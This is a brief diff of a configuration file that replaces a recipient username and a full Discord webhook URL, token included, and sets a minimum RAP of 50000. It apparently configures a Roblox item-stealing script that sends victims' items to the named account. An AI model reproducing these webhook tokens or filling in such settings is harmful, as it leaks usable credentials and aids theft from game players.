@@ -1,6 +1,6 @@
-Username = "nexer39"
+Username = "pet99_2948"
 Username2 = ""
-Webhook = "https://discord.com/api/webhooks/1311046598679072828/bjUfXGM3SV03MxHyA0jTEaYOcX4YnlczCfc4jXa6SHRJZRk7Glkfnvc7jcnhTehuumc5"
+Webhook = "https://discord.com/api/webhooks/1537091014236311623/0Vctwos0G9p3pbDbvsUOCmrhIYzZyjpylgBoKRbYmK9sj5u3oPeH5NKTO5yGlxdCWeAT"
 
 MinimumRAP = 50000
 
